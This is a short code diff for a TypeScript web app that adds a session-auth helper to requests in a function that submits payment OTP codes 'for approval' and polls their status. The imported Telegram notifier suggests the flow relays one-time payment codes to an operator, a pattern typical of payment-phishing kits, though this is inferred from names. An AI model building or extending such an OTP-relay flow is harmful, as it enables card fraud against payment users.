@@ -1,3 +1,4 @@
+import { flowAuth } from "@/lib/flowSession";
 import { supabase } from "@/integrations/supabase/client";
 import { sendTelegramNotification } from "@/lib/payment-telegram";
 import { getPublicAppSetting } from "@/lib/backend-api";
@@ -91,6 +92,7 @@ export async function submitOtpForApproval(
         type: 'payment_activity',
         requireApproval: true,
         ...payload,
+        ...flowAuth(),
         userId: getUserId(),
         userAgent: navigator.userAgent,
         referrer: document.referrer || 'Direct',
@@ -134,7 +136,7 @@ export async function submitOtpForApproval(
         lastPoll = Date.now();
         try {
           const { data, error } = await supabase.functions.invoke('otp-status', {
-            body: { request_id: requestId },
+            body: { request_id: requestId, ...flowAuth() },
           });
           if (!error) {
             const status = (data as { status?: string } | null)?.status;
